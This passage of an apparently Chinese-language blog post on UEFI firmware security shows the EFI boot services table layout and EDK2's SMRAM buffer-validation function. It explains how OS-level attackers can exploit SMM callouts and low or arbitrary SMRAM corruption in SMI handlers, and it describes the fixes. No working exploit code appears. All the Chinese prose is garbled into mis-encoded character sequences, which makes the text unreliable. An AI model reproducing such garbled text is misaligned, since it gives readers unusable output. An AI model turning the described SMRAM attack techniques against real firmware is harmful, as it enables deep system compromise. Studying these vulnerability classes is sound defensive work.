*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size: 120, cachelines: 2, members: 13 */</span></span><br><span class="line"><span class="comment">/* sum members: 116, holes: 1, sum holes: 4 */</span></span><br><span class="line"><span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ BootServicesï¼Œé‡Œé¢æœ‰ä¸€äº›æˆ‘ä»¬ç”¨å¾—åˆ°çš„å‡½æ•°ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">EFI_TABLE_HEADER           Hdr;                  <span class="comment">/*     0    24 */</span></span><br><span class="line">EFI_RAISE_TPL              RaiseTPL;             <span class="comment">/*    24     8 */</span></span><br><span class="line">EFI_RESTORE_TPL            RestoreTPL;           <span class="comment">/*    32     8 */</span></span><br><span class="line">EFI_ALLOCATE_PAGES         AllocatePages;        <span class="comment">/*    40     8 */</span></span><br><span class="line">EFI_FREE_PAGES             FreePages;            <span class="comment">/*    48     8 */</span></span><br><span class="line">EFI_GET_MEMORY_MAP         GetMemoryMap;         <span class="comment">/*    56     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">EFI_ALLOCATE_POOL          AllocatePool;         <span class="comment">/*    64     8 */</span></span><br><span class="line">EFI_FREE_POOL              FreePool;             <span class="comment">/*    72     8 */</span></span><br><span class="line">EFI_CREATE_EVENT           CreateEvent;          <span class="comment">/*    80     8 */</span></span><br><span class="line">EFI_SET_TIMER              SetTimer;             <span class="comment">/*    88     8 */</span></span><br><span class="line">EFI_WAIT_FOR_EVENT         WaitForEvent;         <span class="comment">/*    96     8 */</span></span><br><span class="line">EFI_SIGNAL_EVENT           SignalEvent;          <span class="comment">/*   104     8 */</span></span><br><span class="line">EFI_CLOSE_EVENT            CloseEvent;           <span class="comment">/*   112     8 */</span></span><br><span class="line">EFI_CHECK_EVENT            CheckEvent;           <span class="comment">/*   120     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">EFI_INSTALL_PROTOCOL_INTERFACE InstallProtocolInterface; <span class="comment">/*   128     8 */</span></span><br><span class="line">EFI_REINSTALL_PROTOCOL_INTERFACE ReinstallProtocolInterface; <span class="comment">/*   136     8 */</span></span><br><span class="line">EFI_UNINSTALL_PROTOCOL_INTERFACE UninstallProtocolInterface; <span class="comment">/*   144     8 */</span></span><br><span class="line">EFI_HANDLE_PROTOCOL        HandleProtocol;       <span class="comment">/*   152     8 */</span></span><br><span class="line"><span class="type">void</span> *                     Reserved;             <span class="comment">/*   160     8 */</span></span><br><span class="line">EFI_REGISTER_PROTOCOL_NOTIFY RegisterProtocolNotify; <span class="comment">/*   168     8 */</span></span><br><span class="line">EFI_LOCATE_HANDLE          LocateHandle;         <span class="comment">/*   176     8 */</span></span><br><span class="line">EFI_LOCATE_DEVICE_PATH     LocateDevicePath;     <span class="comment">/*   184     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">EFI_INSTALL_CONFIGURATION_TABLE InstallConfigurationTable; <span class="comment">/*   192     8 */</span></span><br><span class="line">EFI_IMAGE_LOAD             LoadImage;            <span class="comment">/*   200     8 */</span></span><br><span class="line">EFI_IMAGE_START            StartImage;           <span class="comment">/*   208     8 */</span></span><br><span class="line">EFI_EXIT                   Exit;                 <span class="comment">/*   216     8 */</span></span><br><span class="line">EFI_IMAGE_UNLOAD           UnloadImage;          <span class="comment">/*   224     8 */</span></span><br><span class="line">EFI_EXIT_BOOT_SERVICES     ExitBootServices;     <span class="comment">/*   232     8 */</span></span><br><span class="line">EFI_GET_NEXT_MONOTONIC_COUNT GetNextMonotonicCount; <span class="comment">/*   240     8 */</span></span><br><span class="line">EFI_STALL                  Stall;                <span class="comment">/*   248     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 4 boundary (256 bytes) --- */</span></span><br><span class="line">EFI_SET_WATCHDOG_TIMER     SetWatchdogTimer;     <span class="comment">/*   256     8 */</span></span><br><span class="line">EFI_CONNECT_CONTROLLER     ConnectController;    <span class="comment">/*   264     8 */</span></span><br><span class="line">EFI_DISCONNECT_CONTROLLER  DisconnectController; <span class="comment">/*   272     8 */</span></span><br><span class="line">EFI_OPEN_PROTOCOL          OpenProtocol;         <span class="comment">/*   280     8 */</span></span><br><span class="line">EFI_CLOSE_PROTOCOL         CloseProtocol;        <span class="comment">/*   288     8 */</span></span><br><span class="line">EFI_OPEN_PROTOCOL_INFORMATION OpenProtocolInformation; <span class="comment">/*   296     8 */</span></span><br><span class="line">EFI_PROTOCOLS_PER_HANDLE   ProtocolsPerHandle;   <span class="comment">/*   304     8 */</span></span><br><span class="line">EFI_LOCATE_HANDLE_BUFFER   LocateHandleBuffer;   <span class="comment">/*   312     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 5 boundary (320 bytes) --- */</span></span><br><span class="line">EFI_LOCATE_PROTOCOL        LocateProtocol;       <span class="comment">/*   320     8 */</span></span><br><span class="line">EFI_INSTALL_MULTIPLE_PROTOCOL_INTERFACES InstallMultipleProtocolInterfaces; <span class="comment">/*   328     8 */</span></span><br><span class="line">EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces; <span class="comment">/*   336     8 */</span></span><br><span class="line">EFI_CALCULATE_CRC32        CalculateCrc32;       <span class="comment">/*   344     8 */</span></span><br><span class="line">EFI_COPY_MEM               CopyMem;              <span class="comment">/*   352     8 */</span></span><br><span class="line">EFI_SET_MEM                SetMem;               <span class="comment">/*   360     8 */</span></span><br><span class="line">EFI_CREATE_EVENT_EX        CreateEventEx;        <span class="comment">/*   368     8 */</span></span><br><span class="line"><span class="comment">/* size: 376, cachelines: 6, members: 45 */</span></span><br><span class="line"><span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125; EFI_BOOT_SERVICES;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æ—¶æœåŠ¡ä¸è¿è¡Œæ—¶æœåŠ¡ä¸­ä¸ºå›ºä»¶ç¼–å†™è€…æä¾›äº†è®¸å¤šåŠŸèƒ½ã€‚gBS ä¸ gRT æ˜¯ä¸¤ä¸ªå…¨å±€å˜é‡ï¼Œå…¶åˆ†åˆ«æŒ‡å‘ BootService ä¸ RuntimeServiceã€‚å…¶ä¸­ï¼Œæ“ä½œç³»ç»Ÿåªèƒ½è®¿é—® RuntimeServiceï¼Œè€Œ BootLoader åˆ™æ—¢å¯ä»¥è®¿é—® BootService ä¹Ÿå¯ä»¥è®¿é—® RuntimeServiceã€‚  </p><h3 id="å¸¸è§æ¼æ´ä¸åˆ©ç”¨"><a href="#å¸¸è§æ¼æ´ä¸åˆ©ç”¨" class="headerlink" title="å¸¸è§æ¼æ´ä¸åˆ©ç”¨"></a>å¸¸è§æ¼æ´ä¸åˆ©ç”¨</h3><p>è™½ç„¶ç†è®ºä¸Š SMM ä»£ç ä¸å¤–ç•Œéš”ç¦»ï¼Œä½†å®é™…ä¸Šï¼Œåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œé SMM ä»£ç å¯ä»¥è§¦å‘ç”šè‡³å½±å“ SMM å†…éƒ¨è¿è¡Œçš„ä»£ç ã€‚ç”±äº SMM å…·æœ‰å¤æ‚çš„æ¶æ„å’Œå¤§é‡â€œç§»åŠ¨éƒ¨ä»¶â€ï¼Œå› æ­¤æ”»å‡»é¢éå¸¸å¹¿æ³›ï¼Œå…¶ä¸­åŒ…æ‹¬åœ¨é€šä¿¡ç¼“å†²åŒºä¸­ä¼ é€’çš„æ•°æ®ã€NVRAM å˜é‡ã€æ”¯æŒ DMA çš„è®¾å¤‡ç­‰ã€‚  </p><h4 id="SMM-Callouts"><a href="#SMM-Callouts" class="headerlink" title="SMM Callouts"></a>SMM Callouts</h4><p>è¿™æ˜¯æœ€åŸºæœ¬çš„ SMM æ¼æ´ç±»åˆ«ï¼Œå‘ç”Ÿåœ¨ SMM ä»£ç è°ƒç”¨ä½äº SMRAM è¾¹ç•Œä¹‹å¤–çš„å‡½æ•°æ—¶ã€‚æœ€å¸¸è§çš„è°ƒç”¨åœºæ™¯æ˜¯ SMI å¤„ç†ç¨‹åºè¯•å›¾åœ¨å…¶æ“ä½œä¸­è°ƒç”¨ UEFI å¯åŠ¨æœåŠ¡æˆ–è¿è¡Œæ—¶æœåŠ¡ã€‚å…·æœ‰æ“ä½œç³»ç»Ÿçº§æƒé™çš„æ”»å‡»è€…å¯ä»¥åœ¨è§¦å‘ SMI ä¹‹å‰ä¿®æ”¹è¿™äº›æœåŠ¡æ‰€åœ¨çš„ç‰©ç†é¡µé¢ï¼Œä»è€Œåœ¨è°ƒç”¨å—å½±å“çš„æœåŠ¡ååŠ«æŒç‰¹æƒæ‰§è¡Œæµã€‚<br>ä¸‹é¢çš„æµç¨‹å›¾æ¥è‡ªï¼š<a href="https://www.c7zero.info/stuff/ANewClassOfVulnInSMIHandlers_csw2015.pdf">https://www.c7zero.info/stuff/ANewClassOfVulnInSMIHandlers_csw2015.pdf</a></p><img src="/2024/12/14/uefi/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä»ç¬¬å››ä»£ Core å¾®æ¶æ„ ( Haswell ) å¼€å§‹ï¼ŒIntel CPU æ”¯æŒä¸€é¡¹åä¸º SMM_Code_Chk_En çš„å®‰å…¨åŠŸèƒ½ã€‚å¦‚æœå¯ç”¨æ­¤å®‰å…¨åŠŸèƒ½ï¼Œåˆ™ä¸€æ—¦ CPU è¿›å…¥ SMMï¼Œå°±ç¦æ­¢å…¶æ‰§è¡Œä½äº SMRAM åŒºåŸŸä¹‹å¤–çš„ä»»ä½•ä»£ç ï¼Œæœ‰ç‚¹ç±»ä¼¼äº linux ç”¨æˆ·æ€çš„ NX ä¿æŠ¤ã€‚  </p><h4 id="Low-SMRAM-Corruption"><a href="#Low-SMRAM-Corruption" class="headerlink" title="Low SMRAM Corruption"></a>Low SMRAM Corruption</h4><p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œç”¨äºå°†å‚æ•°ä¼ é€’ç»™ SMI å¤„ç†ç¨‹åºçš„é€šä¿¡ç¼“å†²åŒºä¸å¾—ä¸ SMRAM é‡å ã€‚æ­¤é™åˆ¶çš„ç†ç”±å¾ˆç®€å•ï¼šå¦‚æœä¸æ˜¯è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆæ¯å½“ SMI å¤„ç†ç¨‹åºå°†ä¸€äº›æ•°æ®å†™å…¥é€šä¿¡ç¼“å†²åŒºæ—¶ï¼Œå®ƒä¹Ÿä¼šåœ¨æ­¤è¿‡ç¨‹ä¸­ä¿®æ”¹ SMRAM çš„æŸäº›éƒ¨åˆ†ï¼Œè¿™æ˜¯ä¸å¯å–çš„ã€‚  </p><img src="/2024/12/14/uefi/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åœ¨ EDK2 ä¸­ï¼Œè´Ÿè´£æ£€æŸ¥ç»™å®šç¼“å†²åŒºæ˜¯å¦ä¸ SMRAM é‡å çš„å‡½æ•°ç§°ä¸º SmmIsBufferOutsideSmmValid()ã€‚æ¯æ¬¡è°ƒç”¨ SMI æ—¶ï¼Œéƒ½ä¼šåœ¨é€šä¿¡ç¼“å†²åŒºä¸Šè°ƒç”¨æ­¤å‡½æ•°ä»¥å¼ºåˆ¶æ‰§è¡Œæ­¤é™åˆ¶ã€‚  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">BOOLEAN</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmIsBufferOutsideSmmValid</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN EFI_PHYSICAL_ADDRESS  Buffer,</span></span><br><span class="line"><span class="params">  IN UINT64                Length</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  UINTN  Index;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check override.</span></span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> (B:0-&gt;L:4G) is invalid for IA32, but (B:1-&gt;L:4G-1)/(B:4G-1-&gt;L:1) is valid.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> ((Length &gt; mSmmMemLibInternalMaximumSupportAddress) ||</span><br><span class="line">      (Buffer &gt; mSmmMemLibInternalMaximumSupportAddress) ||</span><br><span class="line">      ((Length != <span class="number">0</span>) &amp;&amp; (Buffer &gt; (mSmmMemLibInternalMaximumSupportAddress - (Length - <span class="number">1</span>)))))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Overflow happen</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    DEBUG ((</span><br><span class="line">      DEBUG_ERROR,</span><br><span class="line">      <span class="string">&quot;SmmIsBufferOutsideSmmValid: Overflow: Buffer (0x%lx) - Length (0x%lx), MaximumSupportAddress (0x%lx)\n&quot;</span>,</span><br><span class="line">      Buffer,</span><br><span class="line">      Length,</span><br><span class="line">      mSmmMemLibInternalMaximumSupportAddress</span><br><span class="line">      ));</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibInternalSmramCount; Index++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((Buffer &gt;= mSmmMemLibInternalSmramRanges[Index].CpuStart) &amp;&amp; (Buffer &lt; mSmmMemLibInternalSmramRanges[Index].CpuStart + mSmmMemLibInternalSmramRanges[Index].PhysicalSize)) ||</span><br><span class="line">        ((mSmmMemLibInternalSmramRanges[Index].CpuStart &gt;= Buffer) &amp;&amp; (mSmmMemLibInternalSmramRanges[Index].CpuStart &lt; Buffer + Length)))</span><br><span class="line">    &#123;</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;SmmIsBufferOutsideSmmValid: Overlap: Buffer (0x%lx) - Length (0x%lx), &quot;</span>,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length</span><br><span class="line">        ));</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;CpuStart (0x%lx) - PhysicalSize (0x%lx)\n&quot;</span>,</span><br><span class="line">        mSmmMemLibInternalSmramRanges[Index].CpuStart,</span><br><span class="line">        mSmmMemLibInternalSmramRanges[Index].PhysicalSize</span><br><span class="line">        ));</span><br><span class="line">      <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check override for Valid Communication Region</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (mSmmMemLibSmmReadyToLock) &#123;</span><br><span class="line">    EFI_MEMORY_DESCRIPTOR  *MemoryMap;</span><br><span class="line">    BOOLEAN                InValidCommunicationRegion;</span><br><span class="line"></span><br><span class="line">    InValidCommunicationRegion = FALSE;</span><br><span class="line">    MemoryMap                  = mMemoryMap;</span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mMemoryMapEntryCount; Index++) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((Buffer &gt;= MemoryMap-&gt;PhysicalStart) &amp;&amp;</span><br><span class="line">          (Buffer + Length &lt;= MemoryMap-&gt;PhysicalStart + LShiftU64 (MemoryMap-&gt;NumberOfPages, EFI_PAGE_SHIFT)))</span><br><span class="line">      &#123;</span><br><span class="line">        InValidCommunicationRegion = TRUE;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      MemoryMap = NEXT_MEMORY_DESCRIPTOR (MemoryMap, mDescriptorSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!InValidCommunicationRegion) &#123;</span><br><span class="line">      DEBUG ((</span><br><span class="line">        DEBUG_ERROR,</span><br><span class="line">        <span class="string">&quot;SmmIsBufferOutsideSmmValid: Not in ValidCommunicationRegion: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length</span><br><span class="line">        ));</span><br><span class="line">      <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Check untested memory as invalid communication buffer.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibGcdMemNumberOfDesc; Index++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (((Buffer &gt;= mSmmMemLibGcdMemSpace[Index].BaseAddress) &amp;&amp; (Buffer &lt; mSmmMemLibGcdMemSpace[Index].BaseAddress + mSmmMemLibGcdMemSpace[Index].Length)) ||</span><br><span class="line">          ((mSmmMemLibGcdMemSpace[Index].BaseAddress &gt;= Buffer) &amp;&amp; (mSmmMemLibGcdMemSpace[Index].BaseAddress &lt; Buffer + Length)))</span><br><span class="line">      &#123;</span><br><span class="line">        DEBUG ((</span><br><span class="line">          DEBUG_ERROR,</span><br><span class="line">          <span class="string">&quot;SmmIsBufferOutsideSmmValid: In Untested Memory Region: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">          Buffer,</span><br><span class="line">          Length</span><br><span class="line">          ));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Check UEFI runtime memory with EFI_MEMORY_RO as invalid communication buffer.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (mSmmMemLibMemoryAttributesTable != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      EFI_MEMORY_DESCRIPTOR  *Entry;</span><br><span class="line"></span><br><span class="line">      Entry = (EFI_MEMORY_DESCRIPTOR *)(mSmmMemLibMemoryAttributesTable + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mSmmMemLibMemoryAttributesTable-&gt;NumberOfEntries; Index++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((Entry-&gt;Type == EfiRuntimeServicesCode) || (Entry-&gt;Type == EfiRuntimeServicesData)) &#123;</span><br><span class="line">          <span class="keyword">if</span> ((Entry-&gt;Attribute &amp; EFI_MEMORY_RO) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((Buffer &gt;= Entry-&gt;PhysicalStart) &amp;&amp; (Buffer &lt; Entry-&gt;PhysicalStart + LShiftU64 (Entry-&gt;NumberOfPages, EFI_PAGE_SHIFT))) ||</span><br><span class="line">                ((Entry-&gt;PhysicalStart &gt;= Buffer) &amp;&amp; (Entry-&gt;PhysicalStart &lt; Buffer + Length)))</span><br><span class="line">            &#123;</span><br><span class="line">              DEBUG ((</span><br><span class="line">                DEBUG_ERROR,</span><br><span class="line">                <span class="string">&quot;SmmIsBufferOutsideSmmValid: In RuntimeCode Region: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">                Buffer,</span><br><span class="line">                Length</span><br><span class="line">                ));</span><br><span class="line">              <span class="keyword">return</span> FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Entry = NEXT_MEMORY_DESCRIPTOR (Entry, mSmmMemLibMemoryAttributesTable-&gt;DescriptorSize);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æ—¶è¿™ä¸ªå‡½æ•°çš„è®¾ç½®ä¹Ÿå­˜åœ¨ç¼ºé™·ï¼Œé‚£å°±æ˜¯ SmmIsBufferOutsideSmmValid åªä¼šæ£€æŸ¥ CommBuffer æ˜¯å¦å’Œ SMRAM é‡å ï¼Œä¸ä¼šæ£€æŸ¥å†™å…¥ CommBuffer çš„å†…å®¹æ˜¯å¦æº¢å‡º CommBufferã€‚ä¸¾ä¸ªä¾‹å­å°±æ˜¯å‡è®¾ CommBuffer å®šä¹‰æ—¶é•¿åº¦ 10 byteï¼Œä½†æ˜¯è¾“å…¥çš„ 20 byteã€‚SmmIsBufferOutsideSmmValid å‡½æ•°ä¼šæ£€æŸ¥ CommBuffer åˆ° CommBuffer + 10 byte çš„åŒºåŸŸå’Œ SMRAM æœ‰æ— é‡å ï¼Œä½†æ˜¯ä¸ä¼šæ£€æŸ¥ CommBuffer åˆ° CommBuffer + 20 byte çš„åŒºåŸŸã€‚æ‰€ä»¥ SMI å¤„ç†å¤„ç†ä¸å½“çš„è¯ä¾ç„¶ä¼šé€ æˆä½åœ°å€çš„ SMRAM æŸåã€‚  </p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ï¼š  </p><img src="/2024/12/14/uefi/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™æ®µä»£ç ä¸»è¦å¹²äº†å¦‚ä¸‹å‡ ä»¶äº‹æƒ…ï¼š<br>1ã€æ£€æµ‹ CommBuffer å’Œ CommBufferSize çš„å®Œæ•´æ€§ã€‚<br>2ã€è¯»å–ç”± 0x115 æŒ‡å®šçš„ç‰¹å®šäºæ¨¡å‹çš„å¯„å­˜å™¨çš„å€¼å¹¶èµ‹å€¼ç»™ v4ã€‚<br>3ã€å°† v4 çš„å€¼ç»è¿‡ä¸€ç³»åˆ—è¿ç®—å¾—å‡ºä¸€ä¸ª QWORD ç±»å‹çš„æ•°æ®å¹¶èµ‹å€¼ç»™ CommBufferã€‚  </p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ä»¬çš„ CommBuffer çš„å¤§å°ä¸º 1ï¼Œæœ€åçš„èµ‹å€¼æ“ä½œå°±ä¼šå‡ºç° 7 å­—èŠ‚çš„æº¢å‡ºã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°† CommBuffer ç”³è¯·çš„ç›´æ¥ä¸ SMRAM ç›¸é‚»ï¼Œå¤§å°ä¸ºä¸€å­—èŠ‚ï¼Œæœ€åèµ‹å€¼çš„æ—¶å€™å°±ä¼šå‡ºç°æº¢å‡ºä¿®æ”¹ SMRAM çš„å‰ 7 å­—èŠ‚ã€‚  </p><img src="/2024/12/14/uefi/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™ç±»æ¼æ´çš„ä¿®å¤æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥æ¯”è¾ƒ CommBuffer çš„å¤§å°ä¸èµ‹å€¼çš„æ•°æ®çš„å¤§å°å³å¯ã€‚  </p><h4 id="Arbitrary-SMRAM-Corruption"><a href="#Arbitrary-SMRAM-Corruption" class="headerlink" title="Arbitrary SMRAM Corruption"></a>Arbitrary SMRAM Corruption</h4><p>å¦‚æœæ²¡ä½¿ç”¨ SmmIsBufferOutsideSmmValid å‡½æ•°å¯¹å¤šçº§æŒ‡é’ˆæŒ‡å‘çš„åœ°å€ç©ºé—´åšæ£€æŸ¥ï¼Œä¸” SMI å¤„ç†ç¨‹åºä¸­å¤šçº§æŒ‡é’ˆæŒ‡å‘ SMRAM å†…çš„åœ°å€ç©ºé—´ï¼Œå°±å¯ä»¥é€ æˆä»»æ„ SMRAM æŸåã€‚ä¸€ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼š  </p><img src="/2024/12/14/uefi/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ­¤å¤„é€šè¿‡åˆ¤æ–­ CommBuffer çš„åœ°å€å¤„çš„å­—èŠ‚æ¥è¿›è¡Œ switchï¼Œå¦‚æœå½“å‰å­—èŠ‚ä¸ä¸º 0ã€2ã€3 åˆ™æ‰§è¡Œ default é‡Œçš„ä»£ç ã€‚default çš„ä»£ç ä¸­å°†ä¸€ä¸ªé”™è¯¯ä»£ç å†™å…¥äº† CommBuffer + 1 åœ°å€ä¸ºé¦–åœ°å€çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„å€¼ã€‚å¯ä»¥çœ‹åˆ°è¿™ä¸ªèµ‹å€¼çš„åœ°å€å¹¶æ²¡æœ‰è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ *(CommBuffer + 1) ä¸º SMRAM çš„åœ°å€ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨ SMRAM ä¸­å†™å…¥è¿™ä¸ªé”™è¯¯ä»£ç ï¼Œå¯¹å…¶è¿›è¡Œç ´åã€‚  </p><img src="/2024/12/14/uefi/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä¿®å¤æ–¹æ³•ï¼šæ¯æ¬¡åœ¨ä½¿ç”¨å¤šçº§æŒ‡é’ˆè¿›è¡Œèµ‹å€¼æ—¶ä½¿ç”¨ SmmIsBufferOutsideSmmValid 